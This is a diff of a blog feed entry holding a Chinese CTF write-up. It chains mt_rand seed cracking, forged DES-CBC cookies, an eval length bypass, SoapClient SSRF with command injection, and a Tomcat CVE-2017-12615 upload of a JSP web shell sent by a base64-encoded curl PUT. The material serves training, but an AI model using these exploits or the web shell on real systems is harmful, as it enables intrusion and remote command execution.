@@ -441,13 +905,55 @@ v1 += 3;
     <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/"/>
     <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_northardweb/</id>
     <published>2020-03-09T01:52:20.000Z</published>
-    <updated>2020-03-21T08:49:00.959Z</updated>
+    <updated>2020-03-21T09:10:08.708Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><p>从<a href="http://www.zip获取源码" target="_blank" rel="noopener">www.zip获取源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">   $IV = <span class="string">"85196940"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">           $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">           $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">       &#125;</span><br><span class="line">       $username = <span class="string">"guest"</span>;</span><br><span class="line">       $o = <span class="keyword">new</span> User($username);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       $ser_user = serialize($o);</span><br><span class="line">       $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">       setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">       $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       $o = unserialize($uid);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">           $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">           <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以观察到, 加密模式为<code>des-cbc</code></p><p>但是明文我们却是知道的, 我们看加密的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$o = <span class="keyword">new</span> User($username);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">$ser_user = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br></pre></td></tr></table></figure><p>那么我们现在已知明文密文, 如果能够再获得 key 或者 iv, 就可以直接加解密了, 因为 des-cbc 的加密方式如下（CBC字节翻转原理）</p><p><img src="/2020/03/09/2020_GXZYCTF_northardweb/C:%5CUsers%5Chazel_nut%5CDesktop%5CWEB%E7%AC%AC%E4%B8%89%E8%A1%8C%5C2020_GXZCTF_nothardweb%5Cnorthardweb%5C1584756068474.png" alt="1584756068474"></p><p>我们看第一个块, 首先取 8 个字节的明文, 与<code>IV</code>进行异或, 再与<code>KEY</code>进行加密运算, 之后输出 16 字节的密文, 而如果我们知道<code>KEY</code>, 后面则是用上一个块的加密结果代替<code>IV</code>异或, 而我们如果能知道<code>KEY</code>, 就可以将明文作为<code>IV</code>, 用密文和<code>KEY</code>进行解密, 获得的第一个块的值, 就是 IV</p><p>可以看到红框中的两个部分是一样的, 但是我们如何获取<code>KEY</code>呢, 注意到页面中给了这些信息</p><p><img src="/2020/03/09/2020_GXZYCTF_northardweb/1584756141031.png" alt="1584756141031"></p><p>而源代码中的mt_rand需要seed才能获取随机数。现在已知该函数产生的三个随机数。</p><p>采用文章中介绍的方法获取seed</p><p><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p><p>破解脚本需配置三个参数</p><p>各参数分别为</p><ul><li>相隔 226 个数的 R0, R227</li><li>生成 R0 之前已经生成的个数 offset</li><li>flavour 如果是 php7 则为 1, php5 则为 0</li></ul><p>计算的部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// input seed</span></span><br><span class="line">$uid_first = $argv[<span class="number">1</span>]??<span class="number">1082636436</span>;</span><br><span class="line">$uid_last = $argv[<span class="number">2</span>]??<span class="number">306106574</span>;</span><br><span class="line">$seed = rtrim(shell_exec(<span class="string">"python seed.py $uid_first $uid_last"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"seed: $seed\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc iv</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"guest"</span>);</span><br><span class="line">$mes = serialize($o);</span><br><span class="line">$c = $argv[<span class="number">3</span>]??<span class="string">"OS8vWDE4Mk5ETklJYytXTUFLZG5xU2hJeFkyQ2tXbTJEb01wWkhRUThkckpYcnFDR2RpalFhb3dDekRTem82RQ%3D%3D"</span>;</span><br><span class="line">$cipher = base64_decode(urldecode($c));</span><br><span class="line">mt_srand(intval($seed));</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">228</span>; $i++)&#123;</span><br><span class="line">    mt_rand();</span><br><span class="line">&#125;</span><br><span class="line">$key = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"key: $key\n"</span>;</span><br><span class="line">$iv = substr(openssl_decrypt($cipher, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, substr($mes, <span class="number">0</span>, <span class="number">8</span>)),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"iv: $iv\n"</span>;</span><br></pre></td></tr></table></figure><p>然后我们就可以进行反序列化了, 先登录为<code>admin</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calc iv</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $username;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line">$aaa = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($aaa, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">$cookie_user =  base64_encode($cipher);</span><br><span class="line">$cookie_hash =  md5($aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"user: $cookie_user\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hash: $cookie_hash\n"</span>;</span><br></pre></td></tr></table></figure><h1 id="second"><a href="#second" class="headerlink" title="second"></a>second</h1><p>hint.php 中直接给出了位置, 而右键就可以看到注释的源代码,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cc'</span>]))&#123;</span><br><span class="line">    $cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(substr($cc, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过/?cc=<code>$cc</code>的方式来绕过，因为<code>$cc</code>刚好是 6 个长度, 而<code>$</code>就是重新引用了变量, 使得长度不再受限, 那么我们就可以任意执行了</p><p>但是我们看提示的位置是在内网, 我们进不去, 有什么办法可以进去呢</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>可以看到当调用<code>SoapClient</code>类不存在的方法时, 会触发<code>__call</code>, 使得我们拥有一个请求注入的机会, 这里就正好可以用来打 SSRF, 因为源码中存在一个反序列化, 反序列化的参数可控, 并且会调用一个<code>show()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$o = unserialize($uid);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br></pre></td></tr></table></figure><p>因而poc可以写为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = urlencode(<span class="string">"`\$cc`;bash -c 'payload'"</span>);</span><br><span class="line">$path = <span class="string">"http://10.10.1.12/"</span>;</span><br><span class="line">$path = $path.<span class="string">"?cc=$cmd"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $path, <span class="string">'location'</span> =&gt; $path));</span><br><span class="line">$aaa = serialize($o);</span><br></pre></td></tr></table></figure><h1 id="third"><a href="#third" class="headerlink" title="third"></a>third</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615</a></p><p>一个tomcat的老洞，找到一个jsp马上传</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">out</span>.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">2.13</span>:<span class="number">8080</span><span class="regexp">/2.jsp/</span> -d <span class="string">"`echo PCUKICAgIGlmKCIwMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiaSIpKS5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIGludCBhID0gLTE7CiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTsKICAgICAgICBvdXQucHJpbnQoIjxwcmU+Iik7CiAgICAgICAgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsKICAgICAgICAgICAgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7CiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9CiU+|base64 -d`"</span></span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><p>从<a href="http://www.zip获取源码" target="_blank" rel="noopener">www.zip获取源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">   $IV = <span class="string">"85196940"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">           $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">           $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">       &#125;</span><br><span class="line">       $username = <span class="string">"guest"</span>;</span><br><span class="line">       $o = <span class="keyword">new</span> User($username);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       $ser_user = serialize($o);</span><br><span class="line">       $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">       setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">       $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">       $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">       <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       $o = unserialize($uid);</span><br><span class="line">       <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">       <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">           $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">           <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以观察到, 加密模式为<code>des-cbc</code></p><p>但是明文我们却是知道的, 我们看加密的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$o = <span class="keyword">new</span> User($username);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">$ser_user = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br></pre></td></tr></table></figure><p>那么我们现在已知明文密文, 如果能够再获得 key 或者 iv, 就可以直接加解密了, 因为 des-cbc 的加密方式如下（CBC字节翻转原理）</p><p><img src="/2020/03/09/2020_GXZYCTF_northardweb/1584756068474.png" alt="1584756068474"></p><p>我们看第一个块, 首先取 8 个字节的明文, 与<code>IV</code>进行异或, 再与<code>KEY</code>进行加密运算, 之后输出 16 字节的密文, 而如果我们知道<code>KEY</code>, 后面则是用上一个块的加密结果代替<code>IV</code>异或, 而我们如果能知道<code>KEY</code>, 就可以将明文作为<code>IV</code>, 用密文和<code>KEY</code>进行解密, 获得的第一个块的值, 就是 IV</p><p>可以看到红框中的两个部分是一样的, 但是我们如何获取<code>KEY</code>呢, 注意到页面中给了这些信息</p><p><img src="/2020/03/09/2020_GXZYCTF_northardweb/1584756141031.png" alt="1584756141031"></p><p>而源代码中的mt_rand需要seed才能获取随机数。现在已知该函数产生的三个随机数。</p><p>采用文章中介绍的方法获取seed</p><p><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p><p>破解脚本需配置三个参数</p><p>各参数分别为</p><ul><li>相隔 226 个数的 R0, R227</li><li>生成 R0 之前已经生成的个数 offset</li><li>flavour 如果是 php7 则为 1, php5 则为 0</li></ul><p>计算的部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// input seed</span></span><br><span class="line">$uid_first = $argv[<span class="number">1</span>]??<span class="number">1082636436</span>;</span><br><span class="line">$uid_last = $argv[<span class="number">2</span>]??<span class="number">306106574</span>;</span><br><span class="line">$seed = rtrim(shell_exec(<span class="string">"python seed.py $uid_first $uid_last"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"seed: $seed\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc iv</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"guest"</span>);</span><br><span class="line">$mes = serialize($o);</span><br><span class="line">$c = $argv[<span class="number">3</span>]??<span class="string">"OS8vWDE4Mk5ETklJYytXTUFLZG5xU2hJeFkyQ2tXbTJEb01wWkhRUThkckpYcnFDR2RpalFhb3dDekRTem82RQ%3D%3D"</span>;</span><br><span class="line">$cipher = base64_decode(urldecode($c));</span><br><span class="line">mt_srand(intval($seed));</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">228</span>; $i++)&#123;</span><br><span class="line">    mt_rand();</span><br><span class="line">&#125;</span><br><span class="line">$key = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"key: $key\n"</span>;</span><br><span class="line">$iv = substr(openssl_decrypt($cipher, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, substr($mes, <span class="number">0</span>, <span class="number">8</span>)),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"iv: $iv\n"</span>;</span><br></pre></td></tr></table></figure><p>然后我们就可以进行反序列化了, 先登录为<code>admin</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calc iv</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $username;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line">$aaa = serialize($o);</span><br><span class="line">$cipher = openssl_encrypt($aaa, <span class="string">"des-cbc"</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line">$cookie_user =  base64_encode($cipher);</span><br><span class="line">$cookie_hash =  md5($aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"user: $cookie_user\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hash: $cookie_hash\n"</span>;</span><br></pre></td></tr></table></figure><h1 id="second"><a href="#second" class="headerlink" title="second"></a>second</h1><p>hint.php 中直接给出了位置, 而右键就可以看到注释的源代码,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cc'</span>]))&#123;</span><br><span class="line">    $cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(substr($cc, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过/?cc=<code>$cc</code>的方式来绕过，因为<code>$cc</code>刚好是 6 个长度, 而<code>$</code>就是重新引用了变量, 使得长度不再受限, 那么我们就可以任意执行了</p><p>但是我们看提示的位置是在内网, 我们进不去, 有什么办法可以进去呢</p><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p>可以看到当调用<code>SoapClient</code>类不存在的方法时, 会触发<code>__call</code>, 使得我们拥有一个请求注入的机会, 这里就正好可以用来打 SSRF, 因为源码中存在一个反序列化, 反序列化的参数可控, 并且会调用一个<code>show()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$o = unserialize($uid);</span><br><span class="line"><span class="keyword">echo</span> $o-&gt;show();</span><br></pre></td></tr></table></figure><p>因而poc可以写为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = urlencode(<span class="string">"`\$cc`;bash -c 'payload'"</span>);</span><br><span class="line">$path = <span class="string">"http://10.10.1.12/"</span>;</span><br><span class="line">$path = $path.<span class="string">"?cc=$cmd"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $path, <span class="string">'location'</span> =&gt; $path));</span><br><span class="line">$aaa = serialize($o);</span><br></pre></td></tr></table></figure><h1 id="third"><a href="#third" class="headerlink" title="third"></a>third</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615</a></p><p>一个tomcat的老洞，找到一个jsp马上传</p><figure class="highlight d"><table><tr><td 